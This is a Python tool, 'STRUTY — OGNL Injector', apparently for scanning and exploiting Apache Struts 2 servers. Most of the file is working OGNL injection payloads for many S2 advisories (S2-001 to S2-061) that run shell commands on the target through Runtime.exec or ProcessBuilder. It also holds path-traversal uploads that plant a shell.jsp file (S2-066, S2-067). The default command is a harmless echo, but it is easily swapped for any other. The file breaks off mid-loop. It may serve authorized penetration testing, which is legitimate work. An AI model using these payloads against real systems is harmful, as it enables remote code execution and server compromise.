# -*- coding: utf-8 -*-
import requests
import random
import sys
import re
import argparse
import urllib3
import html
from urllib.parse import urlsplit, urlunsplit, urlparse
from colorama import Fore, Style, init

logo = r"""
              ____
           ,-'-,  `---._
   _______(0} `, , ` , )
  V           ; ` , ` (                      ________
   `.____,- '  (,  `  )\\==================>| S2-XXX |
                   `--'                      ‾‾‾‾‾‾‾‾

              STRUTY — OGNL Injector
"""
print(logo)

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

command_value = "echo struty"
intended_response_value = "struty"
DEFAULT_TIMEOUT = 5

# Validate URLs
def is_valid_url(url):
    clean_parts = urlsplit(url)._replace(query='')
    clean_url = urlunsplit(clean_parts)
    pattern = re.compile(
        r'^https?://'
        r'(([A-Za-z0-9-]+\.)+[A-Za-z]{2,}|'
        r'localhost|'
        r'(\d{1,3}\.){3}\d{1,3})'
        r'(:\d+)?(/.*)?$'
    )
    return clean_url if pattern.match(clean_url) else None

# Args
parser = argparse.ArgumentParser(description="OGNL Injection Exploit PoC")
parser.add_argument("url", help="Target URL (e.g., http://victim.com)")
parser.add_argument("-p", "--parameter", help="Define a parameter. Default: id", default="id")
parser.add_argument("-x", "--proxy", help="Proxy URL", default=None)
parser.add_argument("-c", "--cookie", help="Cookies", default=None)
parser.add_argument("-u", "--user-agent", help="User Agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69")
args = parser.parse_args()

TARGET_URL = is_valid_url(args.url)                                         # https://domain.lab/test/user/user.action
parsed_url = urlparse(TARGET_URL)
TARGET_DOMAIN_SCHEME = f"{parsed_url.scheme}://{parsed_url.netloc}"         # https://domain.lab
TARGET_PATH = parsed_url.path                                               # /test/user/user.action

path_parts = parsed_url.path.rstrip('/').split('/')
TARGET_DIR_PATH = '/' + '/'.join(path_parts[1:-1])                          # /test/user
PATH_LAST_SEGMENT = '/' + path_parts[-1]                                    # /user.action
if len(path_parts) >= 3:
    PATH_MINUS_2_SEGMENT = '/' + path_parts[-3]  # /test
else:
    PATH_MINUS_2_SEGMENT = '/'  # If less than 3 segments, simply return “/”.

parameter=args.parameter
cookies = args.cookie
user_agent = args.user_agent
headers = {
    "User-Agent": user_agent,
    "Cookie": cookies
}
if not TARGET_URL:
    print(Fore.RED + "[-] Invalid target URL.")
    sys.exit(1)

if args.proxy:
    if not is_valid_url(args.proxy):
        print(Fore.RED + "[-] Invalid proxy URL.")
        sys.exit(1)
    proxy = {"http": args.proxy, "https": args.proxy}
    print(Fore.MAGENTA + f"[+] Proxy configured: {args.proxy}\n")
else:
    proxy = None
    print(Fore.MAGENTA + f"[+] No proxy configured. The following vulnerabilities will not be tested: S2-003, S2-005.\n")

print(Fore.YELLOW + "[!] Vulnerabilities S2-001, S2-012, S2-053, S2-059 and S2-061 require manual customization:")
print(Fore.YELLOW + "    - Adjust the parameters (params) based on the target context.")
print(Fore.YELLOW + "    - Check or modify the path if '/login.action' doesn't exist. (S2-001, S2-059, S2-061)")

print(Fore.MAGENTA + "\n[*] Starting debug scan...")
# === Initial Checks ===

print(Fore.CYAN + f"[+] Testing debug=xml")
params = {"debug": "xml"}
for attempt in range(3):
    try:
        response = requests.get(TARGET_URL, headers=headers, params=params, timeout=DEFAULT_TIMEOUT, verify=False, proxies=proxy, allow_redirects=False)
        if response.status_code == 200 and "<debug>" in response.text:
            print(Fore.GREEN + "[!] Debug XML available: " + response.url)
        break
    except requests.exceptions.RequestException as e:
        if attempt == 2:
            print(Fore.RED + f"[-] Connection failed: {e}")
            sys.exit(1)

print(Fore.CYAN + f"[+] Testing debug=browser")
params = {"debug": "browser"}
for attempt in range(3):
    try:
        response = requests.get(TARGET_URL, headers=headers, params=params, timeout=DEFAULT_TIMEOUT, verify=False, proxies=proxy, allow_redirects=False)
        if response.status_code == 200 and "debugTable" in response.text:
            print(Fore.GREEN + "[!] Debug Browser available: " + response.url)
        break
    except requests.exceptions.RequestException as e:
        if attempt == 2:
            print(Fore.RED + f"[-] Connection failed: {e}")
            sys.exit(1)

num1 = random.randint(1, 100)
num2 = random.randint(1, 100)
expected_result = num1 * num2

print(Fore.CYAN + f"[+] Testing debug=console")
params = {"debug": "console"}
for attempt in range(3):
    try:
        response = requests.get(TARGET_URL, headers=headers, params=params, timeout=DEFAULT_TIMEOUT, verify=False, proxies=proxy, allow_redirects=False)
        if response.status_code == 200 and "OGNL Console" in response.text:
            print(Fore.GREEN + "[!] Debug Console available: " + response.url)
        break
    except requests.exceptions.RequestException as e:
        if attempt == 2:
            print(Fore.RED + f"[-] Connection failed: {e}")
            sys.exit(1)

print(Fore.CYAN + f"[+] Calculation Test: {num1} * {num2} (Expected: {expected_result})")
params = {"debug": "command", "expression": f"{num1}*{num2}"}
for attempt in range(3):
    try:
        response = requests.get(TARGET_URL, headers=headers, params=params, timeout=DEFAULT_TIMEOUT, verify=False, proxies=proxy, allow_redirects=False)
        if response.status_code == 200 and str(expected_result) == response.text:
            print(Fore.GREEN + "[!] OGNL Injection vulnerability detected!")
        break
    except requests.exceptions.RequestException as e:
        if attempt == 2:
            print(Fore.RED + f"[-] Connection failed: {e}")
            sys.exit(1)

print(Fore.CYAN + f"[+] Testing struts/webconsole.html")
path = "/struts/webconsole.html"
TARGET_DOMAIN_SCHEME_WEBCONSOLE = TARGET_DOMAIN_SCHEME + path
params = {"debug": "console"}
for attempt in range(3):
    try:
        response = requests.get(TARGET_DOMAIN_SCHEME_WEBCONSOLE, headers=headers, params=params, timeout=DEFAULT_TIMEOUT, verify=False, proxies=proxy, allow_redirects=False)
        if response.status_code == 200 and "Welcome to the OGNL console" in response.text:
            print(Fore.GREEN + "[!] Web console available (can be not functionnal): " + response.url)
        break
    except requests.exceptions.RequestException as e:
        if attempt == 2:
            print(Fore.RED + f"[-] Connection failed: {e}")
            sys.exit(1)
            
def encode_all_chars(s):
    return ''.join(f'%{ord(c):02X}' for c in s)

# Vuln list
struts_vulns = [
    {
        "id": "S2-DevMode",
        "method": "GET",
        "path": "__TARGET__",
        "params": {
            "debug": "browser",
            "object": "(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#context[#parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.command[0]).getInputStream()))):xx.toString.json",
            "rpsobj": "com.opensymphony.xwork2.dispatcher.HttpServletResponse",
            "command": f"{command_value}"
        },
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-DevMode"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]  # Checks if intended_response_value is present in r.text AND ensures that at least one occurrence of intended_response_value in r.text does not match the modified command_value (with spaces replaced by "+")
        ])
    },
    {
        "id": "S2-001",
        "method": "GET_POST",
        "path": f"{TARGET_DIR_PATH}/login.action",
        "params": {
            "username": f'''%{{#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win'),#cmdstr=(#iswin?'cmd.exe /c {command_value}':'/bin/sh -c {command_value}'),#p=@java.lang.Runtime@getRuntime().exec(#cmdstr),#b=#p.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}}''',
            "password": f'''%{{#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win'),#cmdstr=(#iswin?'cmd.exe /c {command_value}':'/bin/sh -c {command_value}'),#p=@java.lang.Runtime@getRuntime().exec(#cmdstr),#b=#p.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}}'''
        },
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-001"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]  # Checks if intended_response_value is present in r.text AND ensures that at least one occurrence of intended_response_value in r.text does not match the modified command_value (with spaces replaced by "+")
        ])
    },
    {
        "id": "S2-003",
        "method": "GET_POST",
        "path": "__TARGET__",
        "params": '''(%27\\u0023context[\\%27xwork.MethodAccessor.denyMethodExecution\\%27]\\u003dfalse%27)(random)(random)&(%27\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET%27)(null)(null)&(%27\\u0023command\\u003d\\%27id\\%27%27)(random)(random)&(%27\\u0023process\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023command)%27)(random)(random)&(A)((%27\\u0023inputStream\\u003dnew\\40java.io.DataInputStream(\\u0023process.getInputStream())%27)(random))&(B)((%27\\u0023outputBytes\\u003dnew\\40byte[51020]%27)(random))&(C)((%27\\u0023inputStream.readFully(\\u0023outputBytes)%27)(random))&(D)((%27\\u0023resultString\\u003dnew\\40java.lang.String(\\u0023outputBytes)%27)(random))&(%27\\u0023response\\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(random)(random)&(E)((%27\\u0023response.getWriter().println(\\u0023resultString)%27)(random))''',
        "headers": {
            "User-Agent" : user_agent,
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Scan": "S2-003"
        },
        "check": lambda r: all([ 
            "uid=" in r.text,
            "gid=" in r.text,
        ])
    },
    {
        "id": "S2-005",
        "method": "GET_POST",
        "path": "__TARGET__",
        "params": encode_all_chars(f'''redirect:${{#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#s=new java.util.Scanner((new java.lang.ProcessBuilder('{command_value}'.toString().split('\\s'))).start().getInputStream()).useDelimiter('\\AAAA'),#str=#s.hasNext()?#s.next():'',#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#resp.getWriter().println(#str),#resp.getWriter().flush(),#resp.getWriter().close()}}'''.replace('\\', '\\\\')),
        "headers": {
            "User-Agent": user_agent,
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Scan": "S2-005"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value] 
        ])
    },
    {
        "id": "S2-008",
        "method": "GET_POST",
        "path": "__TARGET__",
        "params": {
            "debug": "command",
            "expression": f'''(#_memberAccess['allowStaticMethodAccess']=true, #foo=new java.lang.Boolean('false'), #context['xwork.MethodAccessor.denyMethodExecution']=#foo, @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('{command_value}').getInputStream()))'''
        },
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-008"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },
    {
        "id": "S2-012",
        "method": "GET_POST",
        "path": "__TARGET__",
        "params":  {
            f"{parameter}": f'''%{{#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#p=@java.lang.Runtime@getRuntime().exec('{command_value}'),#is=#p.getInputStream(),#br=new java.io.BufferedReader(new java.io.InputStreamReader(#is)),#line=#br.readLine(),#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#resp.getWriter().println(#line),#resp.getWriter().flush(),#resp.getWriter().close()}}'''
            },
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-013"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },
    {
        "id": "S2-013",
        "method": "GET_POST",
        "path": "__TARGET__",
        "params":  {
            "random_param": f'''random=%{{((#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('{command_value}').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close()))}}'''
            },
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-013"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]  # Checks if intended_response_value is present in r.text AND ensures that at least one occurrence of intended_response_value in r.text does not match the modified command_value (with spaces replaced by "+")
        ])
    },
    {
        "id": "S2-016",
        "method": "GET_POST",
        "path": "__TARGET__",
        "params": encode_all_chars(f'''redirect:${{#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec('{command_value}').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}}'''),
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-016"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]  # Checks if intended_response_value is present in r.text AND ensures that at least one occurrence of intended_response_value in r.text does not match the modified command_value (with spaces replaced by "+")
        ])
    },
    {
        "id": "S2-017 (Open-Redirect)",
        "method": "GET_POST",
        "path": "__TARGET__",
        "params": f'redirect:https://fake_domain.lab/{intended_response_value}/url',
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-017"
        },
        "check": lambda r: intended_response_value in str(r.headers.values())
    },
    {
        "id": "S2-019",
        "method": "GET_POST",
        "path": "__TARGET__",
        "params": {
            "debug": "command",
            "expression": f'''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmdToExec='{command_value}').(#os=@java.lang.System@getProperty('os.name').toLowerCase()).(#cmd=(#os.contains('win')?'cmd.exe /c ':'')+#cmdToExec).(#p=@java.lang.Runtime@getRuntime().exec(#cmd)).(#is=#p.getInputStream()).(@org.apache.commons.io.IOUtils@toString(#is))'''
        },
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-019"
        },
        "check": lambda r: all([
            intended_response_value in r.text,
            command_value.replace(" ", "+") not in r.text
        ])
    },
    {
        "id": "S2-032",
        "method": "GET_POST",
        "path": "__TARGET__",
        "params": [
            ('''method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString''', ""),
            ("pp", "\\\\A"),
            ("ppp", ""),
            ("app", " "),
            ("encoding", "UTF-8"),
            ("cmd", command_value)
        ],
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-032",
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },
    {
        "id": "S2-037",
        "method": "GET",
        "path": f'''{TARGET_PATH}/%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23process%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5b0%5d)%2c%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2c%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)%2c%23ros.flush()%2c%23xx%3d123%2c%23xx.toString.json?command={command_value}''',
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-037"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },
    {
        "id": "S2-045",
        "method": "POST",
        "path": "__TARGET__",
        "headers": {
            "Content-Type": (
                '''%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).'''
                f'''(#cmd='{command_value}').'''
                '''(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).'''
                f'''(#p=new\40java.lang.ProcessBuilder(#cmds)).'''
                '''(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'''
            ),
            "User-Agent": user_agent,
            "X-Scan": "S2-045"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },
    {
        "id": "S2-053",
        "method": "GET_POST",
        "path": "__TARGET__",
        "params": {
            f"{parameter}": (
                '''"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).'''
                f'''(#cmd='{command_value}').'''
                '''(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}'''
            )
        },
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-053"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },
    {
        "id": "S2-057_v2.3.20",
        "method": "GET",
        "path": f'''{TARGET_DIR_PATH}/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23cmd%3D%27{command_value}%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D{PATH_LAST_SEGMENT}''',
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-057_v2.5.16"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },
    {
        "id": "S2-057_v2.3.34",
        "method": "GET",
        "path": f'''{TARGET_DIR_PATH}/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27{command_value}%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D{PATH_LAST_SEGMENT}''',
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-057_v2.3.34"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },
    {
        "id": "S2-057_v2.5.16",
        "method": "GET",
        "path": f'''{TARGET_DIR_PATH}/%24%7B%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.setExcludedClasses%28%27java.lang.Shutdown%27%29%29.%28%23ou.setExcludedPackageNames%28%27sun.reflect.%27%29%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27{command_value}%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D{PATH_LAST_SEGMENT}''',
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-057_v2.5.16"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },{
        "id": "S2-059",
        "method": "GET_POST",
        "path": f"{TARGET_DIR_PATH}/login.action",
        "params": {
            "username": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedPackageNames('')).(#ou.setExcludedClasses('')).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('"+command_value+"')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}",
            "password": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedPackageNames('')).(#ou.setExcludedClasses('')).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('"+command_value+"')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}",
        },
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-059"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },
    {
        "id": "S2-061",
        "method": "GET_POST",
        "path": f"{TARGET_DIR_PATH}/login.action",
        "params": {
            "username": f'''{{(#request.map=#@org.apache.commons.collections.BeanMap@{{}}).toString().substring(0,0)+(#request.map.setBean(#request.get('struts.valueStack'))==true).toString().substring(0,0)+(#request.map2=#@org.apache.commons.collections.BeanMap@{{}}).toString().substring(0,0)+(#request.map2.setBean(#request.get('map').get('context'))==true).toString().substring(0,0)+(#request.map3=#@org.apache.commons.collections.BeanMap@{{}}).toString().substring(0,0)+(#request.map3.setBean(#request.get('map2').get('memberAccess'))==true).toString().substring(0,0)+(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{{}}.keySet())==true).toString().substring(0,0)+(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{{}}.keySet())==true).toString().substring(0,0)+(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec(['{command_value}']))}}''',
            "password": f'''{{(#request.map=#@org.apache.commons.collections.BeanMap@{{}}).toString().substring(0,0)+(#request.map.setBean(#request.get('struts.valueStack'))==true).toString().substring(0,0)+(#request.map2=#@org.apache.commons.collections.BeanMap@{{}}).toString().substring(0,0)+(#request.map2.setBean(#request.get('map').get('context'))==true).toString().substring(0,0)+(#request.map3=#@org.apache.commons.collections.BeanMap@{{}}).toString().substring(0,0)+(#request.map3.setBean(#request.get('map2').get('memberAccess'))==true).toString().substring(0,0)+(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{{}}.keySet())==true).toString().substring(0,0)+(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{{}}.keySet())==true).toString().substring(0,0)+(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec(['{command_value}']))}}'''
        },
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-061"
        },
        "check": lambda r: any([ 
            intended_response_value in r.text and command_value not in r.text and command_value.replace(" ", "+") not in r.text
            for intended_response_value in [intended_response_value]
        ])
    },
    {
        "id": "S2-066",
        "method": "POST",
        "path": "__TARGET__",
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-066"
        },
        "multipart": {
            "files": {
                "File": ("shell.jsp", "<% out.println(\"struty\"); %>", "text/plain")
            },
            "data": {
                "fileFileName": "../shell.jsp"
            },
        },
        "verify_upload": {
            "url": f"{PATH_MINUS_2_SEGMENT}/shell.jsp",
            "must_contain": intended_response_value
        }
    },
    {
        "id": "S2-067",
        "method": "POST",
        "path": "__TARGET__",
        "headers": {
            "User-Agent" : user_agent,
            "X-Scan": "S2-067"
        },
        "multipart": {
            "files": {
                "file": ("shell.jsp", "<% out.println(\"struty\"); %>", "text/plain")
            },
            "data": {
                "top.fileFileName": "../shell.jsp"
            },
        },
        "verify_upload": {
            "url": f"{PATH_MINUS_2_SEGMENT}/shell.jsp",
            "must_contain": intended_response_value
        }
    }
]

if not proxy:
    # Filter the list of vulnerabilities to exclude S2-003 and S2-005
    struts_vulns = [vuln for vuln in struts_vulns if vuln["id"] not in ["S2-003", "S2-005"]]

print(Fore.MAGENTA + "\n[*] Starting vulnerability scan...")
detected_vuln = {}

for vuln in struts_vulns:
    path = vuln["path"] if vuln["path"] != "__TARGET__" else TARGET_PATH
    full_url = TARGET_DOMAIN_SCHEME + path
    print(Fore.CYAN + f"[+] Testing {vuln['id']}")
    response = None

    check_headers = dict(vuln["headers"])
    if cookies:
        check_headers["Cookie"] = cookies

    # === Multipart Upload ===
    if "multipart" in vuln:
        multipart = vuln["multipart"]
        files = multipart.get("files", {})
        data = multipart.get("data", {})

        for attempt in range(3):
            try:
                response = requests.post(
                    full_url,
                    files=files,
                    data=data,
                    headers=check_headers,
                    timeout=DEFAULT_TIMEOUT,
                    verify=False,
                    proxies=proxy,
                    allow_redirects=False
                )
                if response.status_code is not None and "no response received from remote server" not in html.unescape(response.text).lower():
                    break
            except requests.exceptions.RequestException as e:
                if attempt == 2:
                    raise e
                print(Fore.YELLOW + f"[!] Retry {attempt + 1}/3 due to: {e}")
        
        if response and "/../shell.jsp" in response.text:
            print(Fore.GREEN + f"[+] {len(files)} file have been successfully uploaded !")

        # check after upload
        if "verify_upload" in vuln:
            check_url = TARGET_DOMAIN_SCHEME + vuln["verify_upload"]["url"]
            try:
                check = requests.get(
                    check_url,
                    headers=check_headers,
                    timeout=DEFAULT_TIMEOUT,
                    verify=False,
                    proxies=proxy,
                    allow_redirects=False
                )
                if check.status_code == 200 and vuln["verify_upload"]["must_contain"] in check.text:
                    print(Fore.GREEN + f"[+] {vuln['id']} vulnerable: {check_url}")

            except requests.exceptions.RequestException as e:
